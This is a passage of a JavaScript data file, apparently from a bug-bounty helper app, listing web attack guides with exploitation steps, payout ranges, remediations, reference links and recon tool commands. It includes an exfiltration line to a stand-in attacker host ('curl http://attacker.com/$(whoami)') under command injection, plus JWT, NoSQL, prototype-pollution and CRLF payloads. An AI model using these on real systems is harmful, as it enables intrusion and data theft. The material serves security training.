      'Trigger SSRF: Set the entity target to cloud metadata endpoints or internal IP ranges.'
    ],
    remediation: 'Completely disable external entity resolution (DTD/External Entities) in your XML parser settings (e.g., setEntityResolver / setFeature).'
  },
  {
    title: 'OAuth Misconfiguration & Account Takeover',
    desc: 'Exploit flawed OAuth flows to hijack user authentication tokens.',
    icon: '🔑',
    severity: 'High to Critical',
    bounty: '$1,000 - $10,000',
    steps: [
      'Initiate OAuth flow and check for the `state` parameter; if missing, test OAuth CSRF.',
      'Test `redirect_uri` validation: Try redirecting to an external site (`redirect_uri=https://evil.com`).',
      'Try validation bypasses: Subdomains (`https://target.com.evil.com`) or directory traversal (`https://target.com/callback/../../evil.com`).',
      'Check for pre-account takeover (registering credentials first, then linking OAuth with different providers).'
    ],
    remediation: 'Enforce strict exact-match validation for `redirect_uri`, always require and validate cryptographically secure `state` tokens, and associate email addresses securely.'
  },
  {
    title: 'API Mass Assignment & BOLA',
    desc: 'Inject unexpected parameters into API requests to elevate privileges.',
    icon: '🎯',
    severity: 'Medium to Critical',
    bounty: '$800 - $8,000',
    steps: [
      'Inspect API payload structures using browser DevTools or Burp Suite.',
      'Find model attributes in responses (e.g., `"role": "user"`, `"isAdmin": false`, `"plan": "free"`).',
      'Send a update request (PUT/POST/PATCH) and inject modified parameters (e.g., `"role": "admin"`).',
      'Verify if values are updated by fetching the object profile again.'
    ],
    remediation: 'Use Data Transfer Objects (DTOs) to explicitly declare bindable properties; avoid blindly binding client payloads directly to database models.'
  },
  {
    title: 'Command Injection (OSCI)',
    desc: 'Execute arbitrary shell commands on the server host.',
    icon: '💻',
    severity: 'High to Critical',
    bounty: '$1,500 - $10,000+',
    steps: [
      'Locate functions interacting with system utilities (PDF conversion, ping tools, image manipulation).',
      'Inject separators: `;`, `|`, `||`, `&&`, or newline characters.',
      'Check for blind injection: Run `sleep 10` or a ping back to your listening domain.',
      'Exfiltrate results out-of-band: Send tool results via `curl http://attacker.com/$(whoami)`.',
      'Bypass WAFs and filters: Use `$IFS` for spaces, or character variables to construct blacklisted commands.'
    ],
    remediation: 'Avoid running commands via system shells; use built-in language APIs/libraries. If commands are necessary, strictly sanitize and allow-list input parameters.'
  },
  {
    title: 'Prototype Pollution',
    desc: 'Inject malicious properties to pollute base object templates in JavaScript.',
    icon: '🧬',
    severity: 'Medium to High',
    bounty: '$1,000 - $7,000',
    steps: [
      'Look for recursive object merges, deep cloning routines, or query string parsing libraries.',
      'Inject properties: `{"__proto__": {"isAdmin": true}}` or `{"constructor": {"prototype": {"isAdmin": true}}}`.',
      'Inspect if variables or controls are overridden globally.',
      'In Node.js backend: Exploit prototype pollution to override variables in system execution commands for RCE.'
    ],
    remediation: 'Sanitize incoming keys to block `__proto__`, `constructor`, and `prototype`; use `Object.create(null)` for map containers, or freeze the prototype chain.'
  },
  {
    title: 'Race Conditions',
    desc: 'Exploit timing discrepancies in concurrent operations.',
    icon: '🏎️',
    severity: 'Medium to High',
    bounty: '$500 - $5,000',
    steps: [
      'Identify transactional state updates: Redeeming coupon codes, fund transfers, point spending.',
      'Send identical concurrent requests at the exact same millisecond (e.g., using Burp Repeater\'s Parallel Groups).',
      'Check if coupon was redeemed multiple times or balance dropped below allowed limits.'
    ],
    remediation: 'Utilize database transactions with appropriate locking mechanisms (pessimistic/optimistic) or implement distributed locks (e.g. via Redis).'
  },
  {
    title: 'HTTP Request Smuggling',
    desc: 'Desynchronize HTTP headers between proxy systems and backend servers.',
    icon: '📦',
    severity: 'High to Critical',
    bounty: '$1,500 - $10,000+',
    steps: [
      'Identify dual-proxy setups: reverse proxies routing to backend application engines.',
      'Craft desync headers: include contradictory Content-Length (CL) and Transfer-Encoding (TE) headers.',
      'Test CL.TE: Frontend handles Content-Length; Backend handles Transfer-Encoding.',
      'Test TE.CL: Frontend handles Transfer-Encoding; Backend handles Content-Length.',
      'Verify desync: Smuggle a partial request and observe if subsequent queries from other users are intercepted.'
    ],
    remediation: 'Configure proxy/backend pairs to exclusively use HTTP/2, disable Transfer-Encoding override options, or use a single unified HTTP engine.'
  },
  {
    title: 'GraphQL Exploitation',
    desc: 'Bypass controls and enumerate schemas in GraphQL endpoints.',
    icon: '📊',
    severity: 'Low to High',
    bounty: '$500 - $6,000',
    steps: [
      'Check for GraphQL API routes: `/graphql`, `/api/graphql`, `/v1/graphql`.',
      'Request schema details: Send an Introspection query to extract all queries, types, and mutations.',
      'If introspection is blocked, try field suggestions fuzzing (e.g., using Clairvoyance).',
      'Test BOLA/IDORs: Swap ID parameters in mutations to alter objects you don\'t own.'
    ],
    remediation: 'Disable introspection and schema mapping in production environments, implement query depth/complexity limits, and enforce authorization checks on all queries/mutations.'
  },
  {
    title: 'Insecure Deserialization',
    desc: 'Inject malformed serialized objects to execute commands or manipulate application logic.',
    icon: '🧩',
    severity: 'High to Critical',
    bounty: '$1,500 - $10,000+',
    steps: [
      'Look for serialized data payloads: Base64 strings starting with `O:` in PHP, or `rO0` in Java.',
      'Locate target backend language: Java, PHP, Python (Pickle), .NET, Node.js.',
      'Generate exploit code payload using tools: Ysoserial (Java) or PHPGGC (PHP).',
      'Inject payload data: Swap the application payload cookie/parameter with your generated payload.'
    ],
    remediation: 'Avoid deserializing data from untrusted sources; use safe data serialization standards like JSON/Protocol Buffers, and restrict gadget classes in execution contexts.'
  },
  {
    title: 'CORS Misconfiguration',
    desc: 'Steal data by exploiting trust in arbitrary request origins.',
    icon: '🌉',
    severity: 'Low to Medium',
    bounty: '$500 - $3,000',
    steps: [
      'Locate API endpoints returning private user data.',
      'Send custom headers: Include an arbitrary origin `Origin: https://evil.com`.',
      'Verify parameters: Vulnerable if `Access-Control-Allow-Origin: https://evil.com` and `Access-Control-Allow-Credentials: true` are returned.',
      'Test alternative origins: `Origin: null` or origin variations.'
    ],
    remediation: 'Avoid reflecting the request origin dynamically in CORS headers; explicitly whitelist allowed origins, and configure SameSite cookies appropriately.'
  },
  {
    title: 'Web Cache Poisoning',
    desc: 'Inject payloads into cached HTTP headers to compromise other visitors.',
    icon: '☠️',
    severity: 'Medium to High',
    bounty: '$1,000 - $6,000',
    steps: [
      'Identify unkeyed headers: `X-Forwarded-Host`, `X-Forwarded-Scheme`, or `X-Original-URL`.',
      'Inject payload into the header and check if it is reflected in the cached response.',
      'Observe standard caching headers: `X-Cache: HIT`, `Cache-Control`, or `Age`.',
      'Verify poisoning: Query the page from a clean browser to ensure the payload is served without the custom header.'
    ],
    remediation: 'Configure the caching proxy to strip unkeyed inputs, use clean cache keys including all headers influencing the response, and disable caching on pages containing user-controlled headers.'
  },
  {
    title: 'JWT Token Exploitation',
    desc: 'Alter JWT signatures or payloads to bypass access controls.',
    icon: '🎫',
    severity: 'Medium to Critical',
    bounty: '$1,000 - $8,000',
    steps: [
      'Locate authentication JWTs in cookies, Authorization headers, or local storage.',
      'Test alg: none: Decode header, change `"alg"` to `"none"`, strip signature block, and send request.',
      'Key Confusion: Convert RS256 algorithm to HS256, and sign the token using the target server\'s public key.',
      'Tamper signatures: Check if signature checks are actually performed by modifying payload data and leaving signature untouched.'
    ],
    remediation: 'Use secure, verified JWT libraries, reject weak algorithms (like `none`), strictly validate the signature before processing payloads, and secure signing keys.'
  },
  {
    title: 'Business Logic Flaws',
    desc: 'Manipulate application workflows and logical structures.',
    icon: '🧠',
    severity: 'Low to High',
    bounty: '$500 - $5,000',
    steps: [
      'Examine logical business rules: Buying quantities, coupon codes, and flow paths.',
      'Cart modification: Attempt negative quantities or direct price parameter overrides.',
      'Workflow bypass: Jump state steps directly (e.g. `/checkout/success` without making payments).',
      'Discount code abuse: Test for concurrent usage bypasses (Race Conditions).'
    ],
    remediation: 'Enforce all validation checks server-side, maintain strict state machines for workflows, and perform sanity checks on prices and totals before finalizing transactions.'
  },
  {
    title: '2FA / MFA Bypass',
    desc: 'Bypass Multi-Factor Authentication controls.',
    icon: '📱',
    severity: 'Medium to Critical',
    bounty: '$1,000 - $7,500',
    steps: [
      'Locate the MFA login validation step.',
      'Brute-force verification: Check if verification endpoints lack rate limits.',
      'Response manipulation: Force JSON response data to bypass validation checks (e.g. `{"success": true}`).',
      'Examine endpoint fallback routes (e.g. bypassing app auth by requesting unrate-limited SMS options).'
    ],
    remediation: 'Implement robust rate limiting and lockout periods on verification endpoints, enforce session-state validation, and never trust client-side response statuses.'
  },
  {
    title: 'Clickjacking (UI Redressing)',
    desc: 'Overlay transparent interfaces to hijack user clicks.',
    icon: '🖱️',
    severity: 'Low to Medium',
    bounty: '$300 - $1,500',
    steps: [
      'Check response headers: Look for missing `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` settings.',
      'Test iframe embedding: Embed the target portal in a transparent iframe on an attacker site.',
      'Overlay alignment: Place interactive buttons directly below target actions (e.g., "Delete Account").'
    ],
    remediation: 'Configure secure HTTP headers like `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors \'none\'` to prevent embedding in unauthorized sites.'
  },
  {
    title: 'Source Code & Info Disclosure',
    desc: 'Locate exposed credentials, backups, or source code files.',
    icon: '🕵️',
    severity: 'Low to High',
    bounty: '$300 - $4,000',
    steps: [
      'Perform directory fuzzing using tools (e.g., `ffuf`, `dirsearch`) targeting backup/log resources.',
      'Examine git structure: Check if `.git/` is exposed, and pull code repositories.',
      'Check system setups: Scan for exposed development logs, API tokens, or `.env` credential variables.'
    ],
    remediation: 'Secure repository directories, disable directory listing/indexing on server configs, and keep configuration/secret files outside of the public web root.'
  },
  {
    title: 'CRLF Injection',
    desc: 'Inject Carriage Return and Line Feed sequences into response headers.',
    icon: '⏎',
    severity: 'Low to Medium',
    bounty: '$300 - $2,500',
    steps: [
      'Locate parameters reflected directly into headers (e.g., redirects or language cookies).',
      'Inject CRLF sequences: `%0d%0a` followed by custom header parameters (e.g., `%0d%0aSet-Cookie: test=true`).',
      'Escalate to XSS: Double inject CRLF sequences to bypass header separation and force code injection into the response body.'
    ],
    remediation: 'Sanitize input by stripping carriage returns (`\r` / `%0d`) and line feeds (`\n` / `%0a`) before passing strings to header constructors.'
  },
  {
    title: 'NoSQL Injection',
    desc: 'Bypass authentication or query data in NoSQL databases.',
    icon: '🍃',
    severity: 'Medium to High',
    bounty: '$1,000 - $6,000',
    steps: [
      'Identify NoSQL input points (JSON API endpoints).',
      'Inject query operators: Pass objects in JSON payloads (e.g., `{"username": {"$ne": null}, "password": {"$ne": null}}`).',
      'Blind extraction: Retrieve database entries using regex flags (e.g., `{"password": {"$regex": "^a"}}`).'
    ],
    remediation: 'Avoid using query structures constructed directly from raw client-supplied JSON objects; use secure MongoDB query helpers or validate types/keys strictly.'
  },
  {
    title: 'LDAP Injection',
    desc: 'Inject control characters to alter directory queries.',
    icon: '📖',
    severity: 'Medium to High',
    bounty: '$1,000 - $5,000',
    steps: [
      'Locate input points interacting with directory service engines.',
      'Test wildcard searches: Inject wildcards (`*`) to query full directory lists.',
      'Inject logic filter components: Use `(`, `)`, `&`, `|`, `!` to override query structures.'
    ],
    remediation: 'Escape all input characters using custom directory-escape rules (e.g., encoding control characters like `*`, `(`, `)`) before executing searches.'
  },
  {
    title: 'Host Header Injection & Link Poisoning',
    desc: 'Manipulate server routing by injecting Host headers.',
    icon: '🏠',
    severity: 'Low to High',
    bounty: '$500 - $4,000',
    steps: [
      'Send custom host requests: Overwrite the `Host` header with an external domain.',
      'Link poisoning: Request a password reset link while passing an custom Host header, and check if link points to your server.',
      'Query override routing: Test virtual hosts parameters (e.g., setting `Host: localhost`).'
    ],
    remediation: 'Avoid using the incoming Host header to construct absolute URLs; configure the web server to drop requests with unrecognized Host headers or use static configurations.'
  },
  {
    title: 'Dependency Confusion',
    desc: 'Coerce build pipelines into downloading packages from public registries.',
    icon: '📦',
    severity: 'High to Critical',
    bounty: '$1,500 - $10,000+',
    steps: [
      'Inspect package manifest configurations (`package.json`, `pnpm-lock.yaml`, `requirements.txt`).',
      'Locate internal or private packages that do not exist on the public registry.',
      'Register the exact package name on the public registry and upload a dummy package with a higher version number (e.g., `99.9.9`).'
    ],
    remediation: 'Configure build pipelines to request private registries exclusively, lock dependencies to exact version hashes, and register placeholder packages on public registries.'
  },
  {
    title: 'WebSockets Attacks',
    desc: 'Intercept and exploit parameters sent over WebSockets.',
    icon: '🔌',
    severity: 'Low to High',
    bounty: '$500 - $4,000',
    steps: [
      'Check for CSWSH (Cross-Site WebSocket Hijacking): Establish a connection from an external origin.',
      'Analyze and modify message structures: Fuzz the fields inside WebSocket messages for standard injection patterns.'
    ],
    remediation: 'Validate origin header bounds on connection handshakes, verify authorization cookies, and sanitize WebSocket payload contents.'
  },
  {
    title: 'Subdomain Takeover',
    desc: 'Claim dead DNS records pointing to inactive cloud platforms.',
    icon: '🚩',
    severity: 'Low to High',
    bounty: '$500 - $3,000',
    steps: [
      'Locate subdomains pointing to cloud environments (S3 buckets, Heroku apps, GitHub pages).',
      'Check CNAME targets for inactive pages (e.g. error page saying "NoSuchBucket" or "domain not found").',
      'Claim the resource: Register the resource on the respective platform to link it to the domain.'
    ],
    remediation: 'Monitor DNS CNAME registers, clean up outdated records immediately, and verify target availability before pointing DNS records to cloud resources.'
  }
];

window.attackGuides = massiveGuides;

window.openToolByName = function(name) {
  const customList = S.customTools || [];
  const customNames = new Set(customList.map(t => t.name.toLowerCase()));
  const builtInList = (window.tools || []).filter(t => !customNames.has(t.name.toLowerCase()));
  const list = customList.concat(builtInList);
  window._renderedToolsList = list;
  
  const idx = list.findIndex(t => t.name.toLowerCase() === name.toLowerCase());
  if (idx !== -1) {
    goPage('tools');
    setTimeout(() => {
      openToolDetail(idx);
    }, 50);
  } else {
    toast(`Tool "${name}" not found`, 'error');
  }
};

// Curated assets and tools for Attack Guides playbook
const guideResources = {
  'SQL Injection (SQLi)': {
    tools: ['SQLMap', 'Burp Suite'],
    links: [
      { name: 'OWASP SQLi Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html' },
      { name: 'PortSwigger SQLi Academy', url: 'https://portswigger.net/web-security/sql-injection' }
    ]
  },
  'Cross-Site Scripting (XSS)': {
    tools: ['XSStrike', 'Burp Suite'],
    links: [
      { name: 'OWASP XSS Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html' },
      { name: 'PortSwigger XSS Academy', url: 'https://portswigger.net/web-security/cross-site-scripting' }
    ]
  },
  'Insecure Direct Object Reference (IDOR)': {
    tools: ['ffuf', 'Burp Suite'],
    links: [
      { name: 'OWASP IDOR Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html' },
      { name: 'PortSwigger Access Control Academy', url: 'https://portswigger.net/web-security/access-control' }
    ]
  },
  'Server-Side Request Forgery (SSRF)': {
    tools: ['SSRFmap', 'Burp Suite'],
    links: [
      { name: 'OWASP SSRF Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html' },
      { name: 'PortSwigger SSRF Academy', url: 'https://portswigger.net/web-security/ssrf' }
    ]
  },
  'Local File Inclusion (LFI) & Path Traversal': {
    tools: ['ffuf', 'Burp Suite'],
    links: [
      { name: 'HackTricks LFI Guide', url: 'https://book.hacktricks.xyz/pentesting-web/file-inclusion' },
      { name: 'PortSwigger Path Traversal Academy', url: 'https://portswigger.net/web-security/file-path-traversal' }
    ]
  },
  'Server-Side Template Injection (SSTI)': {
    tools: ['tplmap', 'Burp Suite'],
    links: [
      { name: 'HackTricks SSTI Guide', url: 'https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection' },
      { name: 'PortSwigger Template Injection Academy', url: 'https://portswigger.net/web-security/server-side-template-injection' }
    ]
  },
  'XML External Entity (XXE)': {
    tools: ['Burp Suite'],
    links: [
      { name: 'OWASP XXE Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html' },
      { name: 'PortSwigger XXE Academy', url: 'https://portswigger.net/web-security/xxe' }
    ]
  },
  'OAuth Misconfiguration & Account Takeover': {
    tools: ['Burp Suite'],
    links: [
      { name: 'PortSwigger OAuth Academy', url: 'https://portswigger.net/web-security/oauth' }
    ]
  },
  'API Mass Assignment & BOLA': {
    tools: ['Burp Suite'],
    links: [
      { name: 'OWASP API Security Top 10', url: 'https://owasp.org/www-project-api-security/' }
    ]
  },
  'Command Injection (OSCI)': {
    tools: ['Commix', 'Burp Suite'],
    links: [
      { name: 'OWASP Command Injection Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html' },
      { name: 'PortSwigger Command Injection Academy', url: 'https://portswigger.net/web-security/os-command-injection' }
    ]
  },
  'Prototype Pollution': {
    tools: ['Burp Suite'],
    links: [
      { name: 'PortSwigger Prototype Pollution Academy', url: 'https://portswigger.net/web-security/prototype-pollution' }
    ]
  },
  'Race Conditions': {
    tools: ['Burp Suite'],
    links: [
      { name: 'PortSwigger Race Conditions Academy', url: 'https://portswigger.net/web-security/race-conditions' }
    ]
  },
  'HTTP Request Smuggling': {
    tools: ['Burp Suite'],
    links: [
      { name: 'PortSwigger Request Smuggling Academy', url: 'https://portswigger.net/web-security/request-smuggling' }
    ]
  },
  'GraphQL Exploitation': {
    tools: ['Burp Suite'],
    links: [
      { name: 'PortSwigger GraphQL Academy', url: 'https://portswigger.net/web-security/graphql' }
    ]
  },
  'Insecure Deserialization': {
    tools: ['Burp Suite'],
    links: [
      { name: 'PortSwigger Deserialization Academy', url: 'https://portswigger.net/web-security/deserialization' }
    ]
  },
  'CORS Misconfiguration': {
    tools: ['Burp Suite'],
    links: [
      { name: 'PortSwigger CORS Academy', url: 'https://portswigger.net/web-security/cors' }
    ]
  },
  'Web Cache Poisoning': {
    tools: ['Burp Suite'],
    links: [
      { name: 'PortSwigger Web Cache Poisoning Academy', url: 'https://portswigger.net/web-security/web-cache-poisoning' }
    ]
  },
  'JWT Token Exploitation': {
    tools: ['Burp Suite'],
    links: [
      { name: 'PortSwigger JWT Academy', url: 'https://portswigger.net/web-security/jwt' }
    ]
  },
  'Source Code & Info Disclosure': {
    tools: ['ffuf', 'Trufflehog / Gitleaks', 'SecretFinder'],
    links: [
      { name: 'Trufflehog Git Secrets', url: 'https://github.com/trufflesecurity/trufflehog' }
    ]
  },
  'Subdomain Takeover': {
    tools: ['Subfinder', 'Amass', 'Nuclei'],
    links: [
      { name: 'Can I Take Over XYZ?', url: 'https://github.com/EdOverflow/can-i-take-over-xyz' }
    ]
  }
};

window.attackGuides.forEach(g => {
  const res = guideResources[g.title];
  if (res) {
    g.tools = res.tools;
    g.links = res.links;
  }
});


// 4. RECON AUTOMATION TOOLS & CHEATSHEETS
const massiveTools = [
  // === RECON & OSINT ===
  {
    name: 'Subfinder',
    author: 'ProjectDiscovery',
    desc: 'Fast passive subdomain discovery tool.',
    coverImg: '/static/images/subfinder.png',
    cmd: 'subfinder -d target.com -all -o subs.txt',
    tags: ['Recon & Discovery', 'Subdomains'],
    books: 'Bug Bounty Bootcamp',
    videos: 'https://www.youtube.com/watch?v=Jm_XoQ_6B7U',
    cheatSheetHtml: `<iframe src="/tools/subfinder_cs" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:550px; border:none; background: transparent; margin-top: 8px;"></iframe>`,
    cheatSheet: `-all : Use all sources (slow but comprehensive)
-silent : Only output subdomains
-t 100 : Number of concurrent goroutines
-v : Verbose output`
  },
  {
    name: 'Amass',
    author: 'OWASP',
    desc: 'In-depth attack surface mapping and asset discovery.',
    coverImg: '/static/images/amass.png',
    cmd: 'amass enum -passive -d target.com -o amass.txt',
    tags: ['Recon & Discovery', 'Subdomains', 'ASN'],
    books: 'The Hacker Playbook 3',
    videos: 'https://www.youtube.com/watch?v=mXoQ_6B7U',
    cheatSheetHtml: `<iframe src="/static/cheat_sheets/amass_cs.html" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:550px; border:none; background: transparent; margin-top: 8px;"></iframe>`,
    cheatSheet: `amass enum -active -d target.com -src -ip -brute
amass intel -asn 13374 -whois -d target.com
amass track -d target.com (track changes over time)`
  },
  {
    name: 'theHarvester',
    coverImg: '/static/images/theharvester.png',
    desc: 'E-mails, subdomains and names OSINT tool.',
    cmd: 'theHarvester -d target.com -l 500 -b all',
    tags: ['Recon & Discovery', 'OSINT'],
    cheatSheetHtml: `<iframe src="/static/cheat_sheets/theHarvester_cs.html" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:550px; border:none; background: transparent; margin-top: 8px;"></iframe>`,
    cheatSheet: `-b all : Use all data sources
-l 500 : Limit number of results
-f results.html : Save output to HTML`
  },
  {
    name: 'Naabu',
    coverImg: '/static/images/naabu.png',
    desc: 'Fast port scanner with reliability focus.',
    cmd: 'naabu -host target.com -top-ports 1000 -o ports.txt',
    tags: ['Recon & Discovery', 'Port Scanning'],
    cheatSheetHtml: `<iframe src="/static/cheat_sheets/naabu_cs.html" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:550px; border:none; background: transparent; margin-top: 8px;"></iframe>`,
    cheatSheet: `-p - : Scan all 65535 ports
-p 80,443,8080 : Scan specific ports
-c 50 : Concurrent workers
-nmap : Pass results to nmap for service discovery`
  },
  {
    name: 'Nmap',
    coverImg: '/static/images/nmap.png',
    desc: 'The industry standard network mapper.',
    cmd: 'nmap -sC -sV -p- -T4 target.com',
    tags: ['Recon & Discovery', 'Port Scanning'],
    cheatSheetHtml: `<iframe src="/static/cheat_sheets/nmap_cs.html" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:550px; border:none; background: transparent; margin-top: 8px;"></iframe>`,
    cheatSheet: `-sC : Default NSE scripts
-sV : Service version detection
-p- : All 65535 ports
-T4 : Aggressive timing (faster)
-Pn : Treat all hosts as online (skip ping)
-A : OS detection, version detection, script scanning, and traceroute`
  },
  {
    name: 'Masscan',
    desc: 'Mass IP port scanner. Scans the entire Internet in under 6 minutes.',
    cmd: 'masscan -p1-65535 10.0.0.0/8 --rate=10000',
    tags: ['Recon & Discovery', 'Port Scanning'],
    cheatSheetHtml: `<iframe src="/static/cheat_sheets/masscan_cs.html" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:550px; border:none; background: transparent; margin-top: 8px;"></iframe>`,
    cheatSheet: `--rate=10000 : Max packets per second (tune for your connection)
-p80,443,8080 : Specify ports
--router-mac : Specify MAC address to bypass routing issues`
  },
  {
    name: 'RustScan',
    desc: 'Modern port scanner built in Rust. Incredibly fast.',
    cmd: 'rustscan -a target.com --ulimit 5000 -- -sV -sC',
    tags: ['Recon & Discovery', 'Port Scanning'],
    cheatSheet: `-a : Target IP/Range/Domain
--ulimit 5000 : Raise file descriptor limit
-- : Pass remaining arguments to Nmap`
  },

  // === DNS & SUBDOMAIN TAKEOVER ===
  {
    name: 'dnsx',
    coverImg: '/static/images/dnsx.png',
    desc: 'Fast and multi-purpose DNS toolkit.',
    cmd: 'dnsx -l subs.txt -resp -a -cname -o resolved.txt',
    tags: ['DNS & Takeover', 'DNS'],
    cheatSheetHtml: `<iframe src="/static/cheat_sheets/dnsx_cs.html" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:550px; border:none; background: transparent; margin-top: 8px;"></iframe>`,
    cheatSheet: `-a : Query A records
-cname : Query CNAME records
-resp : Show DNS response
-wc : Wildcard filtering`
  },
  {
    name: 'puredns',
    desc: 'Fast domain resolver and subdomain bruteforcer.',
    cmd: 'puredns bruteforce wordlist.txt target.com',
    tags: ['DNS & Takeover', 'DNS'],
    cheatSheetHtml: `<iframe src="/static/cheat_sheets/puredns_cs.html" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:550px; border:none; background: transparent; margin-top: 8px;"></iframe>`,
    cheatSheet: `puredns resolve domains.txt -r resolvers.txt
-w output.txt : Save valid results
--wildcard-tests 50 : Number of tests for wildcard detection`
  },
  {
    name: 'subjack',
    desc: 'Subdomain takeover vulnerability checker.',
    cmd: 'subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl',
    tags: ['DNS & Takeover', 'Takeover'],
    cheatSheet: `-t 100 : Threads
-timeout 30 : Timeout in seconds
-ssl : Enforce HTTPS requests
-a : Check all records, not just CNAME`
  },
  {
    name: 'subzy',
    desc: 'Subdomain takeover vulnerability scanner.',
    cmd: 'subzy run --targets subdomains.txt',
    tags: ['DNS & Takeover', 'Takeover'],
    cheatSheet: `--concurrency 100 : Number of concurrent checks
--hide_fails : Only show vulnerable targets
--verify_ssl : Verify SSL certificates`
  },
  
  // === HTTP PROBING & CRAWLING ===
  {
    name: 'httpx',
    desc: 'Fast multi-purpose HTTP toolkit.',
    cmd: 'httpx -l subs.txt -sc -title -tech-detect -o alive.txt',
    tags: ['HTTP & Crawling', 'Probing'],
    cheatSheet: `-status-code : Show HTTP status code
-title : Show page title
-tech-detect : Fingerprint technologies (Wappalyzer)
-location : Follow redirects and show location
-p 80,443,8080,8443 : Probe specific ports`
  },
  {
    name: 'Katana',
    coverImg: '/static/images/katana.png',
    desc: 'Next-generation crawling and spidering framework.',
    cmd: 'katana -u https://target.com -jc -d 3',
    tags: ['HTTP & Crawling', 'Spidering'],
    cheatSheetHtml: `<iframe src="/static/cheat_sheets/katana_cs.html" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:550px; border:none; background: transparent; margin-top: 8px;"></iframe>`,
    cheatSheet: `-jc : Parse JavaScript files for endpoints
-d 3 : Crawl depth of 3
-fs rdn : Filter out out-of-scope domains (regex)
-o urls.txt : Save output to file`
  },
  {
    name: 'Waybackurls / Gau',
    desc: 'Fetch known URLs from the Wayback Machine and AlienVault.',
    cmd: 'echo "target.com" | waybackurls > urls.txt',
    tags: ['HTTP & Crawling', 'Archive'],
    cheatSheetHtml: `<iframe src="/static/cheat_sheets/waybackurls-cs.html" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:550px; border:none; background: transparent; margin-top: 8px;"></iframe>`,
    cheatSheet: `gau target.com --subs | httpx -silent
# Filter out useless extensions:
cat urls.txt | grep -vE '\\.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico)$'`
  },
  {
    name: 'gospider',
    desc: 'Fast web spider written in Go.',
    cmd: 'gospider -s "https://target.com/" -c 10 -d 1',
    tags: ['HTTP & Crawling', 'Spidering'],
    cheatSheetHtml: `<iframe src="/static/cheat_sheets/gospider_cs.html" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:550px; border:none; background: transparent; margin-top: 8px;"></iframe>`,
    cheatSheet: `-s : Site to spider
-S : File containing sites
-c : Concurrent connections
-d : Depth
-a : Check third-party domains`
  },
  {
    name: 'hakrawler',
    desc: 'Fast web crawler for gathering URLs.',
    cmd: 'cat domains.txt | hakrawler',
    tags: ['HTTP & Crawling', 'Spidering'],
    cheatSheet: `-d 2 : Depth to crawl
-t 8 : Threads
-plain : Output plain text (just URLs)`
  },
  
  // === FUZZING & DIRECTORY BRUTEFORCING ===
  {
    name: 'ffuf',
    coverImg: '/static/images/ffuf.png',
    desc: 'Fast web fuzzer written in Go.',
    cmd: 'ffuf -w wordlist.txt -u https://target.com/FUZZ',
    tags: ['Fuzzing', 'Web Directories'],
    cheatSheetHtml: `<iframe src="/static/cheat_sheets/ffuf_cs.html" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:550px; border:none; background: transparent; margin-top: 8px;"></iframe>`,
    cheatSheet: `-mc 200,301,302 : Match specific status codes
-fs 4242 : Filter by specific response size
-H "Authorization: Bearer X" : Add custom header
-X POST -d "param=FUZZ" : Fuzz POST data
-H "Host: FUZZ.target.com" : Fuzz Virtual Hosts`
  },
  {
    name: 'Dirsearch',
    desc: 'Classic web path scanner.',
    cmd: 'dirsearch -u https://target.com -e php,html,js',
    tags: ['Fuzzing', 'Web Directories'],
    cheatSheet: `-e php,asp,jsp : Extensions to append
-x 400,403,404 : Exclude status codes
-t 50 : Threads
-r : Recursive brute force`
  },
  {
    name: 'gobuster',
    desc: 'Directory/file, DNS and VHost busting tool written in Go.',
    cmd: 'gobuster dir -u https://target.com -w wordlist.txt',
    tags: ['Fuzzing', 'Web Directories'],
    cheatSheetHtml: `<iframe src="/static/cheat_sheets/gobuster_cs.html" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:550px; border:none; background: transparent; margin-top: 8px;"></iframe>`,
    cheatSheet: `gobuster dns -d target.com -w subdomains.txt
gobuster vhost -u target.com -w vhosts.txt
-t 50 : Number of concurrent threads
-x php,txt,html : File extensions to search`
  },
  {
    name: 'feroxbuster',
    desc: 'Fast, simple, recursive content discovery tool written in Rust.',
    cmd: 'feroxbuster -u https://target.com -w wordlist.txt',
    tags: ['Fuzzing', 'Web Directories'],
    cheatSheetHtml: `<iframe src="/static/cheat_sheets/feroxbuster_cs.html" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:550px; border:none; background: transparent; margin-top: 8px;"></iframe>`,
    cheatSheet: `-d 2 : Maximum recursion depth
-t 50 : Number of concurrent threads
-x php,html : File extensions to search
--extract-links : Extract links from response body`
  },

  // === PARAMETER & SECRET DISCOVERY ===
  {
    name: 'Arjun',
    desc: 'HTTP parameter discovery suite.',
    cmd: 'arjun -u https://target.com/endpoint',
    tags: ['Discovery', 'Parameters'],
    cheatSheetHtml: `<iframe src="/static/cheat_sheets/arjun_cs.html" onload="injectIframeTheme(this)" scrolling="no" style="width:100%; height:550px; border:none; background: transparent; margin-top: 8px;"></iframe>`,
    cheatSheet: `-m POST : Test POST parameters
-w wordlist.txt : Custom wordlist
-t 10 : Number of threads
-c 500 : Chunk size (params per request)`
  },
  {
    name: 'ParamSpider',
